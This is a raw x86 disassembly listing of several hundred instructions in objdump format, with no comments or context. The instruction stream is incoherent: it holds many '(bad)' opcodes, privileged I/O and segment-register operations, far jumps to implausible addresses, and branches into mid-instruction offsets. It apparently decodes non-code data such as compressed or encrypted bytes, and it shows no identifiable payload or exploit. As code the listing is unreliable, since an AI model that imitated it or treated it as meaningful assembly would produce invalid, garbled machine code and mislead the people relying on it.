  421de1:	jmp    0x421dfb
  421de3:	or     al,0x41
  421de5:	pop    ds
  421de6:	imul   esp,DWORD PTR [esi+0x6464a02],0xffffffa5
  421ded:	cmp    BYTE PTR [eax-0x85d38],ch
  421df3:	ret    0xdf5
  421df6:	xchg   ebx,eax
  421df7:	cmp    al,0xad
  421df9:	loope  0x421d9f
  421dfb:	push   ds
  421dfc:	xor    ebx,esp
  421dfe:	iret   
  421dff:	xor    DWORD PTR [ecx+0x2c3e96d8],esi
  421e05:	rcr    BYTE PTR [ecx],cl
  421e07:	fwait
  421e08:	adc    eax,esp
  421e0a:	leave  
  421e0b:	rol    DWORD PTR [edx],cl
  421e0d:	fstp   DWORD PTR [ebx]
  421e0f:	inc    esi
  421e10:	xor    ecx,DWORD PTR [edi]
  421e12:	sbb    ch,cl
  421e14:	xor    ecx,edi
  421e16:	push   0xffffffb7
  421e18:	push   ebx
  421e19:	fwait
  421e1a:	inc    esi
  421e1b:	xor    BYTE PTR [ebp+0x1c],al
  421e1e:	mov    ebp,0xb734f9f
  421e23:	fwait
  421e24:	jns    0x421dfb
  421e26:	shr    DWORD PTR [ecx-0x4a97142f],0xc
  421e2d:	and    eax,0x96e23319
  421e32:	test   al,0xfc
  421e34:	jecxz  0x421dd1
  421e36:	push   ecx
  421e37:	test   al,0xdc
  421e39:	push   0xffffffdd
  421e3b:	fidiv  WORD PTR [ebx+0x5d930e6f]
  421e41:	adc    al,0xb
  421e43:	dec    edi
  421e44:	sub    al,0xa2
  421e46:	cmp    eax,0xf662e6e1
  421e4b:	std    
  421e4c:	rcl    edx,cl
  421e4e:	jns    0x421e9d
  421e50:	lahf   
  421e51:	stos   BYTE PTR es:[edi],al
  421e52:	je     0x421e39
  421e54:	jge    0x421e9e
  421e56:	into   
  421e57:	(bad)  
  421e59:	push   0xffffff86
  421e5b:	mov    DWORD PTR [ecx+0x43],ebx
  421e5e:	inc    ebx
  421e5f:	dec    esp
  421e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e61:	call   ebp
  421e63:	nop
  421e64:	call   0xde1517a6
  421e69:	cmp    DWORD PTR [ecx],ecx
  421e6b:	cmp    al,0xde
  421e6d:	xchg   edx,eax
  421e6e:	in     eax,dx
  421e6f:	xchg   edx,eax
  421e70:	pop    ebp
  421e71:	pop    ebp
  421e72:	outs   dx,DWORD PTR ds:[esi]
  421e73:	sub    al,0x86
  421e75:	and    BYTE PTR [eax-0x69],dh
  421e78:	jne    0x421dfc
  421e7a:	adc    BYTE PTR [ebx+0x67],bl
  421e7d:	and    DWORD PTR [esi*4-0x7c2e3d01],esi
  421e84:	sbb    al,0x13
  421e86:	lahf   
  421e87:	das    
  421e88:	lahf   
  421e89:	mov    fs,edi
  421e8b:	add    ah,BYTE PTR [ebp+0x60]
  421e8e:	int    0x32
  421e90:	mov    bh,0x53
  421e92:	add    dh,BYTE PTR [ebp+0x3e]
  421e95:	jne    0x421eb5
  421e97:	in     eax,dx
  421e98:	cmp    eax,0x8faff9a7
  421e9d:	sub    al,0xd4
  421e9f:	pop    edx
  421ea0:	and    DWORD PTR [ebx+eax*1-0x614f52d4],0xd6164b92
  421eab:	dec    ebp
  421eac:	scas   eax,DWORD PTR es:[edi]
  421ead:	ret    0xdb4b
  421eb0:	ss call 0xed878bb
  421eb6:	cmp    ecx,0xffffffc8
  421eb9:	mov    ds:0x9ff8138,al
  421ebe:	test   al,0xf3
  421ec0:	and    BYTE PTR [edi+0x3c],cl
  421ec3:	shr    esp,cl
  421ec5:	xor    eax,0x10c392ba
  421eca:	mov    dh,0x3a
  421ecc:	ja     0x421f46
  421ece:	in     eax,dx
  421ecf:	push   ds
  421ed0:	xchg   esp,eax
  421ed1:	add    al,0xfd
  421ed3:	xchg   edi,eax
  421ed4:	rcl    DWORD PTR [eax+0x41768e20],cl
  421eda:	ins    BYTE PTR es:[edi],dx
  421edb:	jne    0x421ecc
  421edd:	xchg   esi,eax
  421ede:	pusha  
  421edf:	push   ebx
  421ee0:	mov    dh,0x4f
  421ee2:	mov    edi,0xf3fd2319
  421ee7:	dec    ecx
  421ee8:	hlt    
  421ee9:	fist   WORD PTR [esi+0x13]
  421eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421eed:	pusha  
  421eee:	cmp    DWORD PTR [eax],0xffffffb9
  421ef1:	in     al,0x9
  421ef3:	scas   al,BYTE PTR es:[edi]
  421ef4:	inc    esi
  421ef5:	inc    esi
  421ef6:	in     eax,0xec
  421ef8:	in     eax,dx
  421ef9:	or     eax,0x23243206
  421efe:	ins    DWORD PTR es:[edi],dx
  421eff:	and    bl,BYTE PTR [edi+0x744f76e1]
  421f05:	adc    dh,BYTE PTR ds:0xb8be0d23
  421f0b:	mov    ebx,0xbdcc12df
  421f10:	jnp    0x421eae
  421f12:	mov    al,ds:0xe5ba528a
  421f17:	fwait
  421f18:	outs   dx,DWORD PTR ds:[esi]
  421f19:	mov    esi,0xfca65569
  421f1e:	aam    0x11
  421f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f21:	scas   eax,DWORD PTR es:[edi]
  421f22:	addr16 and eax,0xeaa85b59
  421f28:	rcr    DWORD PTR [edi],1
  421f2a:	in     eax,0xbe
  421f2c:	push   esp
  421f2d:	in     al,dx
  421f2e:	mov    esp,0x9fead3a2
  421f33:	sub    eax,0x9b967ccb
  421f38:	neg    DWORD PTR [esi+ebx*4-0x4f]
  421f3c:	retf   0xbee8
  421f3f:	jne    0x421f66
  421f41:	ficom  DWORD PTR [eax-0x25]
  421f44:	mov    edi,0xd5f3f2dc
  421f49:	nop
  421f4a:	sub    dh,dl
  421f4c:	out    0x65,eax
  421f4e:	cmp    al,0xc5
  421f50:	stos   DWORD PTR es:[edi],eax
  421f51:	call   0x8486fb9c
  421f56:	sar    DWORD PTR [ebx+0x54],0xa3
  421f5a:	add    eax,DWORD PTR [edi-0x207f5ea9]
  421f60:	arpl   WORD PTR [ebp+0x405a1fcb],bp
  421f66:	push   eax
  421f67:	xor    ebx,edx
  421f69:	mov    esi,0xbcd496bb
  421f6e:	es loop 0x421f77
  421f71:	xchg   edx,eax
  421f72:	xchg   ecx,eax
  421f73:	gs mov ebp,0x7c4e98fe
  421f79:	pop    ss
  421f7a:	mov    ds:0xfe2697ce,al
  421f7f:	inc    ebp
  421f80:	add    cl,BYTE PTR [esp+edi*2]
  421f83:	retf   
  421f84:	mov    eax,0x1cca26e4
  421f89:	or     DWORD PTR [ecx-0x764a0d2b],edi
  421f8f:	in     al,0xf0
  421f91:	int3   
  421f92:	push   edi
  421f93:	push   cs
  421f94:	arpl   WORD PTR [ebp-0x917c530],ax
  421f9a:	and    BYTE PTR [ecx+0x6a],ah
  421f9d:	sub    BYTE PTR ds:0x57e8002c,cl
  421fa3:	in     eax,0x81
  421fa5:	sub    al,0x2e
  421fa7:	(bad)  
  421fa8:	(bad)  
  421faa:	pusha  
  421fab:	sub    BYTE PTR [esi-0x6c],cl
  421fae:	ficomp DWORD PTR [edi]
  421fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fb1:	pop    ds
  421fb2:	fcomp  DWORD PTR [eax]
  421fb4:	xchg   ebx,eax
  421fb5:	leave  
  421fb6:	xchg   edi,eax
  421fb7:	jb     0x421f95
  421fb9:	inc    esp
  421fba:	jno    0x421f44
  421fbc:	jl     0x422035
  421fbe:	mov    eax,0x19ae7dfd
  421fc3:	push   ebp
  421fc4:	xchg   DWORD PTR [esi-0x3ba75b71],esp
  421fca:	stc    
  421fcb:	arpl   WORD PTR [ebp-0xb7c457d],cx
  421fd1:	jecxz  0x422031
  421fd3:	hlt    
  421fd4:	pop    es
  421fd5:	idiv   BYTE PTR [edx+0x77]
  421fd8:	cmp    DWORD PTR [eax-0x3e916dc4],esi
  421fde:	pop    ecx
  421fdf:	fisttp QWORD PTR [edx]
  421fe1:	inc    edx
  421fe2:	jmp    0x3bef:0x35ee4e8b
  421fe9:	jne    0x421f79
  421feb:	mov    ah,0xfd
  421fed:	xchg   edx,eax
  421fee:	inc    eax
  421fef:	ret    
  421ff0:	popf   
  421ff1:	mov    ah,0x64
  421ff3:	push   edx
  421ff4:	les    edi,FWORD PTR [esp+eax*4]
  421ff7:	adc    al,0x5a
  421ff9:	pop    ebp
  421ffa:	(bad)  
  421ffc:	push   0x7b24fa04
  422001:	and    DWORD PTR [eax-0x67],eax
  422004:	gs ret 0xed6d
  422008:	sub    dh,BYTE PTR [ecx+0x45e63346]
  42200e:	push   eax
  42200f:	addr16 dec esi
  422011:	and    BYTE PTR [edx-0x31dc4d0e],0x5a
  422018:	les    ebx,FWORD PTR [esi+0x26fca00d]
  42201e:	popf   
  42201f:	push   edi
  422020:	add    bh,dl
  422022:	sub    ebx,DWORD PTR [ebp-0x4cd214fa]
  422028:	test   edx,esp
  42202a:	pop    dx
  42202c:	leave  
  42202d:	jbe    0x421fd3
  42202f:	jp     0x42209b
  422031:	add    BYTE PTR [esi],cl
  422033:	xor    ebx,edx
  422035:	xchg   DWORD PTR ds:0xb4aaabb6,edx
  42203b:	add    dh,BYTE PTR [esi-0x1d]
  42203e:	loop   0x422046
  422040:	fdivr  QWORD PTR [ecx+0x491e91f4]
  422046:	inc    ebp
  422047:	into   
  422048:	(bad)  [esi+ebx*2]
  42204b:	ret    0x95de
  42204e:	nop
  42204f:	push   ebp
  422050:	leave  
  422051:	mov    al,ds:0x46c371d1
  422056:	ret    0x5b9c
  422059:	sub    al,0xbc
  42205b:	scas   eax,DWORD PTR es:[edi]
  42205c:	adc    DWORD PTR [edx-0x40],edi
  42205f:	or     eax,0x4bd94aa2
  422064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422065:	push   ecx
  422066:	daa    
  422067:	adc    eax,0x3d2ebd66
  42206c:	dec    edi
  42206d:	mov    ecx,0xe461ac7c
  422072:	adc    DWORD PTR [ebx],0x2a
  422075:	xor    al,BYTE PTR [ebx+0x7e5a9005]
  42207b:	fs imul esi,ecx,0xc3dfc25c
  422082:	dec    ecx
  422083:	data16 xlat BYTE PTR ds:[ebx]
  422085:	push   es
  422086:	es pop ebx
  422088:	scas   al,BYTE PTR es:[edi]
  422089:	push   esp
  42208a:	lock pop ecx
  42208c:	arpl   WORD PTR [edi+0x5c],di
  42208f:	div    WORD PTR [ebx+ebp*2-0x4a]
  422094:	pop    eax
  422095:	imul   esi,edi,0x5f
  422098:	jmp    0xd2394d5c
  42209d:	ss xor al,0xa
  4220a0:	push   esi
  4220a1:	cmc    
  4220a2:	or     bh,BYTE PTR [eax-0x76c4abf7]
  4220a8:	scas   eax,DWORD PTR es:[edi]
  4220a9:	rcl    BYTE PTR [edi],cl
  4220ab:	mov    eax,ds:0xe52be2bc
  4220b0:	aad    0xf9
  4220b2:	lea    ecx,[ecx+0x22]
  4220b5:	jo     0x422111
  4220b7:	pop    eax
  4220b8:	sub    ah,BYTE PTR [ebx-0x58531a44]
  4220be:	add    BYTE PTR [edi+0x2d],dl
  4220c1:	adc    al,0xb7
  4220c3:	jmp    0x422099
  4220c5:	arpl   WORD PTR [edx-0x427078f4],di
  4220cb:	adc    eax,0x8a1264eb
  4220d0:	jns    0x42208c
  4220d2:	mov    ds:0x7901dd4c,eax
  4220d7:	xchg   edx,eax
  4220d8:	pop    edx
  4220d9:	not    BYTE PTR [ecx-0x51]
  4220dc:	aaa    
  4220dd:	and    al,0x1b
  4220df:	pop    es
  4220e0:	neg    esp
  4220e2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4220e4:	addr16 pushw ds
  4220e7:	or     eax,0x41177123
  4220ec:	stos   BYTE PTR es:[edi],al
  4220ed:	cmp    BYTE PTR [bp+0x1],dh
  4220f1:	fdivr  st(6),st
  4220f3:	xlat   BYTE PTR ds:[ebx]
  4220f4:	enter  0x17c4,0x1e
  4220f8:	xchg   ebx,eax
  4220f9:	xchg   esp,eax
  4220fa:	scas   eax,DWORD PTR es:[edi]
  4220fb:	sub    al,0x9e
  4220fd:	lea    eax,[edi]
  4220ff:	and    ch,BYTE PTR [esi-0x4f]
  422102:	scas   eax,DWORD PTR es:[edi]
  422103:	je     0x422184
  422105:	xchg   BYTE PTR [eax-0x5f],cl
  422108:	adc    bh,cl
  42210a:	adc    BYTE PTR [ebp+0x65c817bf],al
  422110:	pushf  
  422111:	jo     0x42214a
  422113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422114:	or     DWORD PTR [esi-0x1851e3d4],0x74
  42211b:	addr16 inc esi
  42211d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42211f:	lods   eax,DWORD PTR ds:[esi]
  422120:	rol    BYTE PTR [ecx],0x9d
  422123:	aam    0xac
  422125:	and    DWORD PTR [eax],esp
  422127:	xchg   esp,eax
  422128:	mov    dl,0xa0
  42212a:	fcomp  QWORD PTR [esi]
  42212c:	add    DWORD PTR [edi+0x6fbdbdf3],eax
  422132:	in     al,0xcf
  422134:	jno    0x4220f9
  422136:	out    0x7,al
  422138:	out    0x91,al
  42213a:	rcr    DWORD PTR [ecx],0x24
  42213d:	sbb    eax,0xe26b5e2d
  422142:	dec    eax
  422143:	jne    0x422137
  422145:	and    DWORD PTR [ebx+0x19468a80],eax
  42214b:	ins    DWORD PTR es:[edi],dx
  42214c:	push   edi
  42214d:	sbb    BYTE PTR [ecx],ch
  42214f:	je     0x4221c1
  422151:	call   0x3197:0xf3d8d322
  422158:	jmp    0x55abf5d8
  42215d:	mov    dh,0x99
  42215f:	in     eax,0xde
  422161:	rcl    BYTE PTR [edi+0x3d],0xe4
  422165:	sbb    al,0xa9
  422167:	xor    ebx,DWORD PTR [ebx+0x78]
  42216a:	jnp    0x422187
  42216c:	imul   ebp,DWORD PTR [ecx-0x34],0xeaa3fa28
  422173:	ins    BYTE PTR es:[edi],dx
  422174:	not    BYTE PTR [edi]
  422176:	iret   
  422177:	pop    ecx
  422178:	nop
  422179:	je     0x422137
  42217b:	mov    al,ds:0x8b3deb9c
  422180:	adc    eax,0xa12ae4ac
  422185:	pop    ecx
  422186:	aad    0x3b
  422188:	cmp    al,0xd0
  42218a:	sar    DWORD PTR [esi+0x2880da63],1
  422190:	jecxz  0x42215d
  422192:	lahf   
  422193:	or     edi,0xffffffe4
  422196:	fs inc edi
  422198:	(bad)  
  422199:	shl    BYTE PTR [ecx-0x2588eb80],0x3b
  4221a0:	sbb    dl,BYTE PTR [edx+0x6c]
  4221a3:	add    dh,BYTE PTR [ecx]
  4221a5:	add    esp,eax
  4221a7:	inc    edi
  4221a8:	add    ebp,DWORD PTR [ebp-0x27]
  4221ab:	jae    0x422221
  4221ad:	ret    0x1fc7
  4221b0:	aaa    
  4221b1:	aam    0x54
  4221b3:	ret    0x89ee
  4221b6:	and    BYTE PTR [ebx+0x1238bb15],ah
  4221bc:	rcr    DWORD PTR [ebx+0x52],0x69
  4221c0:	xor    eax,0x5c732d3
  4221c5:	jl     0x42222b
  4221c7:	ret    
  4221c8:	test   BYTE PTR [eax],dh
  4221ca:	inc    ebx
  4221cb:	sbb    BYTE PTR [esp+eax*1+0x6e],bh
  4221cf:	and    DWORD PTR [eax+0x40],edx
  4221d2:	xor    ch,bh
  4221d4:	adc    ch,BYTE PTR [edx-0x1a26595]
  4221da:	iret   
  4221db:	adc    dh,ch
  4221dd:	cmp    BYTE PTR [ecx],bl
  4221df:	cmc    
  4221e0:	push   esp
  4221e1:	enter  0x5914,0xdf
  4221e5:	sbb    eax,0x144910d4
  4221ea:	push   0xffffffc7
  4221ec:	ins    DWORD PTR es:[edi],dx
  4221ed:	cli    
  4221ee:	test   eax,0x5245ce28
  4221f3:	rol    BYTE PTR [edi-0x2b],1
  4221f6:	or     BYTE PTR [ecx+0x5],dl
  4221f9:	(bad)  
  4221fa:	cmpxchg al,bl
  4221fd:	sub    al,BYTE PTR [edi+0x4ceae1e4]
  422203:	stc    
  422204:	mov    ecx,0xeaeac3a8
  422209:	sub    cl,ah
  42220b:	lahf   
  42220c:	push   ebx
  42220d:	icebp  
  42220e:	loop   0x422252
  422210:	mov    eax,ds:0x10948150
  422215:	into   
  422216:	daa    
  422217:	pop    ds
  422218:	dec    eax
  422219:	mov    ebx,0xf4f8ea9c
  42221e:	call   0x825f5f2f
  422223:	jecxz  0x422282
  422225:	in     eax,0xf6
  422227:	fidiv  WORD PTR [esi+0x9d49025]
  42222d:	popa   
  42222e:	lods   eax,DWORD PTR ds:[esi]
  42222f:	mov    edx,0xca14704b
  422234:	in     al,dx
  422235:	pop    edx
  422236:	lock push es
  422238:	gs jg  0x4221c4
  42223b:	xchg   ecx,eax
  42223c:	cwde   
  42223d:	sub    eax,DWORD PTR [ebp+0x6b]
  422240:	sbb    ebx,DWORD PTR [edx+esi*4-0x3b]
  422244:	jae    0x422243
  422246:	out    0x68,al
  422248:	fstp   TBYTE PTR ds:[edx-0x4927bfb5]
  42224f:	push   edx
  422250:	out    dx,al
  422251:	jp     0x422216
  422253:	in     eax,0xf9
  422255:	lea    eax,[eax]
  422257:	int3   
  422258:	arpl   WORD PTR [edx],cx
  42225a:	jge    0x4221dc
  42225c:	cmp    DWORD PTR [esp+edx*4+0x4f],ebx
  422260:	jmp    0x66d3:0x6b97c971
  422267:	enter  0xa190,0x8
  42226b:	jae    0x42220f
  42226d:	fs dec esp
  42226f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422270:	cmp    esi,DWORD PTR [ebp-0x43]
  422273:	iret   
  422274:	xor    dh,BYTE PTR [edx-0x207ee008]
  42227a:	dec    edx
  42227b:	sbb    eax,DWORD PTR [eax]
  42227d:	or     eax,ebp
  42227f:	jae    0x42222f
  422281:	aam    0x77
  422283:	call   DWORD PTR [eax]
  422285:	lds    ebx,FWORD PTR [ebx-0x64cfc448]
  42228b:	jno    0x422214
  42228d:	mov    ds:0x1f83ed6b,eax
  422292:	mov    gs,esp
  422294:	jne    0x42223b
  422296:	sahf   
  422297:	jle    0x422286
  422299:	mul    BYTE PTR [esi+0x11d8818b]
  42229f:	out    dx,al
  4222a0:	int3   
  4222a1:	mov    esp,0x99ba6fdb
  4222a6:	addr16 adc eax,0x961a98f1
  4222ac:	add    eax,0x4a939ced
  4222b1:	sti    
  4222b2:	mov    esi,0x6c37b4a9
  4222b7:	mov    ah,bl
  4222b9:	mov    ebp,0x455b0c35
  4222be:	lods   eax,DWORD PTR ds:[esi]
  4222bf:	idiv   BYTE PTR [edi-0x55]
  4222c2:	xchg   BYTE PTR [edi+0x56],bl
  4222c5:	es push ecx
  4222c7:	or     ebp,edx
  4222c9:	xor    BYTE PTR [esi+0x6e908889],al
  4222cf:	xchg   esi,eax
  4222d0:	lods   eax,DWORD PTR ds:[esi]
  4222d1:	cmp    bl,BYTE PTR [esi+0x1b0db669]
  4222d7:	xlat   BYTE PTR ds:[ebx]
  4222d8:	ins    BYTE PTR es:[edi],dx
  4222d9:	jecxz  0x42230a
  4222db:	das    
  4222dc:	dec    esi
  4222dd:	jmp    0x422346
  4222df:	cmp    DWORD PTR [edx+edx*2-0x41],eax
  4222e3:	sbb    BYTE PTR cs:[esi-0xe6bfa97],0xf4
  4222eb:	aad    0x4a
  4222ed:	(bad)  
  4222ee:	fadd   QWORD PTR [ecx+0x4020ae53]
  4222f4:	fcomp  QWORD PTR [eax]
  4222f6:	mov    dh,ah
  4222f8:	mov    ebx,0xf0ad140c
  4222fd:	and    al,0x40
  4222ff:	fld    QWORD PTR [ebp+0x59]
  422302:	mov    DWORD PTR [ecx],ebx
  422304:	dec    ebp
  422305:	pop    ebp
  422306:	mov    al,0xc
  422308:	push   ebx
  422309:	sub    BYTE PTR [ebp-0x4d],dh
  42230c:	fst    DWORD PTR [edx]
  42230e:	out    dx,eax
  42230f:	cwde   
  422310:	into   
  422311:	shl    BYTE PTR ds:0x8943388e,cl
  422317:	dec    edi
  422318:	aad    0x6c
  42231a:	stc    
  42231b:	imul   esp,DWORD PTR [edx+0x1e672408],0x42
  422322:	cmp    eax,0xa09ea75f
  422327:	dec    eax
  422328:	adc    BYTE PTR [eax+0x6b48c081],al
  42232e:	cmp    al,0xd5
  422330:	in     eax,0xfa
  422332:	add    eax,0xc3ac4662
  422337:	les    ecx,FWORD PTR [ebp+0x146c8b0d]
  42233d:	int3   
  42233e:	xor    DWORD PTR [edx],edx
  422340:	daa    
  422341:	je     0x4223b8
  422343:	sahf   
  422344:	push   ds
  422345:	mov    es:0x14bb5133,al
  42234b:	inc    edx
  42234c:	adc    bh,BYTE PTR [esi]
  42234e:	in     eax,dx
  42234f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422350:	arpl   WORD PTR [ecx],cx
  422352:	inc    esp
  422353:	and    BYTE PTR [ebx+edx*2],al
  422356:	inc    ebp
  422357:	inc    edi
  422358:	cmp    al,0x76
  42235a:	sub    BYTE PTR [ebp+0x53],0x1a
  42235e:	lea    edx,[ecx+0x3b7702eb]
  422364:	ins    DWORD PTR es:[edi],dx
  422365:	gs pusha 
  422367:	push   es
  422368:	adc    BYTE PTR [ecx-0x3c],cl
  42236b:	jns    0x4223a5
  42236d:	xchg   ecx,eax
  42236e:	sar    dh,cl
  422370:	iret   
  422371:	stos   BYTE PTR es:[edi],al
  422372:	fs jns 0x4223eb
  422375:	add    BYTE PTR [edi+0x3fef11cc],bh
  42237b:	gs jo  0x4223d5
  42237e:	icebp  
  42237f:	push   ebx
  422380:	fwait
  422381:	jbe    0x4223b3
  422383:	mov    ecx,0xb5b3e52f
  422388:	xchg   BYTE PTR [ebp-0x5ef3b074],cl
  42238e:	pop    es
  42238f:	push   es
  422390:	scas   al,BYTE PTR es:[edi]
  422391:	cmp    eax,0xc1706868
  422396:	sbb    BYTE PTR ds:0x9f2214b2,bh
  42239c:	pop    esi
  42239d:	push   0x4
  42239f:	mov    al,0xf4
  4223a1:	fisttp DWORD PTR [eax+0x6ff2ccdb]
  4223a7:	add    al,0xb4
  4223a9:	lahf   
  4223aa:	dec    ecx
  4223ab:	outs   dx,DWORD PTR ds:[esi]
  4223ac:	mov    dh,0x11
  4223ae:	push   ebp
  4223af:	in     eax,dx
  4223b0:	jne    0x422386
  4223b2:	fs jecxz 0x422394
  4223b5:	inc    esp
  4223b6:	into   
  4223b7:	sub    cl,al
  4223b9:	in     eax,0xd8
  4223bb:	clc    
  4223bc:	push   ebx
  4223bd:	jbe    0x4223bc
  4223bf:	push   edx
  4223c0:	mov    ss,WORD PTR [esi-0x4c]
  4223c3:	popa   
  4223c4:	pop    esi
  4223c5:	cmp    DWORD PTR [eax+ecx*2-0x6b8b59ce],esp
  4223cc:	outs   dx,DWORD PTR ds:[esi]
  4223cd:	es xchg edx,eax
  4223cf:	jae    0x42239a
  4223d1:	jmp    0x42242c
  4223d3:	sub    al,0x97
  4223d5:	fsubr  DWORD PTR [eax]
  4223d7:	cmp    al,bh
  4223d9:	dec    esi
  4223da:	(bad)  
  4223db:	out    0x59,al
  4223dd:	xchg   esp,eax
  4223de:	pushf  
  4223df:	and    dh,al
  4223e1:	mov    dh,0x9e
  4223e3:	popa   
  4223e4:	xor    BYTE PTR [edx],ah
  4223e6:	jg     0x4223ff
  4223e8:	or     eax,0xa4069ae0
  4223ed:	retf   0x49a6
  4223f0:	and    ecx,0xfade6dfb
  4223f6:	mov    dh,0x5e
  4223f8:	bound  edx,QWORD PTR [esi]
  4223fa:	mov    ch,0xcb
  4223fc:	sub    ch,BYTE PTR [edi]
  4223fe:	push   eax
  4223ff:	fmul   DWORD PTR [ecx+0x2e]
  422402:	mov    ds:0x1d5f09b7,al
  422407:	xchg   esp,edx
  422409:	gs js  0x42243f
  42240c:	fdiv   QWORD PTR [ebx]
  42240e:	mov    ebp,DWORD PTR [ebx-0x767fc6c1]
  422414:	mov    eax,0xf3e39d60
  422419:	mov    bh,0xac
  42241b:	fcomip st,st(3)
  42241d:	call   0x80d9dd8d
  422422:	mov    edx,ebx
  422424:	mov    ds:0x1bfe887c,al
  422429:	xor    dh,BYTE PTR [ecx]
  42242b:	jge    0x42241b
  42242d:	sub    eax,0x556a6260
  422432:	or     DWORD PTR [esi-0x66],esp
  422435:	mov    ecx,0x6e3e012f
  42243a:	and    DWORD PTR [ebx],esi
  42243c:	mov    ch,0xa7
  42243e:	daa    
  42243f:	pop    esp
  422440:	and    al,0x48
  422442:	jle    0x422481
  422444:	cli    
  422445:	dec    ebx
  422446:	xchg   ebx,eax
  422447:	enter  0xeaeb,0x0
  42244b:	push   edx
  42244c:	cld    
  42244d:	cmp    esp,DWORD PTR [ecx]
  42244f:	mov    BYTE PTR [esi],cl
  422451:	dec    edi
  422452:	sbb    dh,BYTE PTR [eax-0x1ab1aea7]
  422458:	loopne 0x4224d1
  42245a:	test   al,0x6d
  42245c:	leave  
  42245d:	outs   dx,BYTE PTR ds:[esi]
  42245e:	call   0x2a76:0xd7b954c0
  422465:	push   es
  422466:	loop   0x4224b9
  422468:	jp     0x42248d
  42246a:	ds popf 
  42246c:	ss popf 
  42246e:	int    0xd4
  422470:	stos   BYTE PTR es:[edi],al
  422471:	or     eax,0xfda9db0e
  422476:	xchg   esp,edi
  422478:	lods   eax,DWORD PTR ds:[esi]
  422479:	enter  0x51fd,0xf3
  42247d:	sbb    esp,DWORD PTR [esi+0x41592fcb]
  422483:	ds mul edi
  422486:	(bad)  
  422487:	in     eax,0xa7
  422489:	fsub   DWORD PTR [bp+si-0x5e68]
  42248e:	fiadd  WORD PTR [edi+0x2c47184b]
  422494:	lock jnp 0x422432
  422497:	shl    BYTE PTR [eax+0x7a],1
  42249a:	add    al,BYTE PTR [eax+0x75]
  42249d:	cmp    ah,ah
  42249f:	mov    eax,ds:0x5648b23a
  4224a4:	test   eax,0x8c61aa11
  4224a9:	scas   eax,DWORD PTR es:[edi]
  4224aa:	nop
  4224ab:	gs sub eax,0x22348b37
  4224b1:	js     0x4224d5
  4224b3:	push   0x58
  4224b5:	fst    DWORD PTR [esi]
  4224b7:	xchg   esi,eax
  4224b8:	or     DWORD PTR [edx+0x43],edx
  4224bb:	adc    edi,DWORD PTR [edi+0x7d593d9b]
  4224c1:	or     eax,0x417e716d
  4224c6:	lods   eax,DWORD PTR ds:[esi]
  4224c8:	xchg   ebx,eax
  4224c9:	stos   BYTE PTR es:[edi],al
  4224ca:	add    ebp,esi
  4224cc:	push   DWORD PTR [eax-0x2e]
  4224cf:	push   0xffffffcd
  4224d1:	jae    0x422519
  4224d3:	inc    ebx
  4224d4:	and    dl,BYTE PTR [ecx+0x2fe5a87f]
  4224da:	xor    esp,ebx
  4224dc:	adc    DWORD PTR ds:0xe61b0324,ecx
  4224e2:	pop    es
  4224e3:	mov    dh,0x36
  4224e5:	imul   esp,DWORD PTR [ebp-0x68dd0319],0xffffffe2
  4224ec:	push   es
  4224ed:	data16 div BYTE PTR [esi+ebp*4-0x5c79b2e9]
  4224f5:	jg     0x4224ae
  4224f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f8:	or     esp,DWORD PTR [ebx+0x25]
  4224fb:	mov    bl,0x41
  4224fd:	in     eax,dx
  4224fe:	mov    esp,DWORD PTR [edi+0x36]
  422501:	scas   al,BYTE PTR es:[edi]
  422502:	and    edx,DWORD PTR [esp+eax*8+0x487aae83]
  422509:	jl     0x4224e0
  42250b:	jo     0x42250f
  42250d:	sbb    BYTE PTR [edi],cl
  42250f:	adc    al,0x16
  422511:	pop    es
  422512:	(bad)  
  422513:	add    BYTE PTR [ebx],dh
  422515:	(bad)  
  422516:	in     al,dx
  422517:	adc    al,0x47
  422519:	and    BYTE PTR [esi+0x1e3ab3ac],0xa4
  422520:	rol    BYTE PTR [eax],cl
  422522:	call   0xd879:0x11bc588e
  422529:	out    0x2d,al
  42252b:	loope  0x422516
  42252d:	dec    edi
  42252e:	inc    ecx
  42252f:	fwait
  422530:	push   0x8c0c32f
  422535:	test   DWORD PTR [ecx-0x2d],ebp
  422538:	ins    BYTE PTR es:[edi],dx
  422539:	adc    DWORD PTR [edi+ecx*1-0x21],edx
  42253d:	sub    eax,0x78fa31bf
  422542:	iret   
  422543:	jne    0x42250e
  422545:	out    0x6d,al
  422547:	cmc    
  422548:	loope  0x422518
  42254a:	jp     0x4224fc
  42254c:	dec    edx
  42254d:	sbb    DWORD PTR [esi],esp
  42254f:	pop    edx
  422550:	pop    es
  422551:	add    eax,0x74869706
  422556:	mov    esi,0x9b0de48d
  42255b:	jo     0x4225a0
  42255d:	(bad)  
  42255e:	cdq    
  42255f:	xchg   DWORD PTR [edx-0x6e],ebp
  422562:	jae    0x4225a7
  422564:	repnz sub BYTE PTR [eax+0x54],bl
  422568:	lock mov ah,0x83
  42256b:	das    
  42256c:	bound  esp,QWORD PTR [edi-0x3e]
  42256f:	xchg   DWORD PTR [ecx+0x59],esp
  422572:	inc    edi
  422573:	xor    bh,BYTE PTR [ecx-0x57]
  422576:	stos   DWORD PTR es:[edi],eax
  422577:	adc    cl,BYTE PTR [edi+0x7b20dd5f]
  42257d:	ss pop ebp
  42257f:	mov    cl,0x42
  422581:	mov    ecx,0xa0d01c53
  422586:	mov    al,dl
  422588:	test   al,0x3
  42258a:	gs pop edi
  42258c:	cmp    edi,DWORD PTR [ecx+0x5b]
  42258f:	ffreep st(1)
  422591:	xchg   edx,eax
  422592:	add    eax,0x799b8b29
  422597:	cmp    eax,0x5cc2090e
  42259c:	call   0x980e9177
  4225a1:	mov    ds:0xcc65f027,al
  4225a6:	inc    ebx
  4225a7:	cs stc 
  4225a9:	xchg   edx,eax
  4225aa:	sahf   
  4225ab:	ret    
  4225ac:	sub    DWORD PTR [edi+0x78ec6d33],esp
  4225b2:	xor    dl,bh
  4225b4:	pop    ss
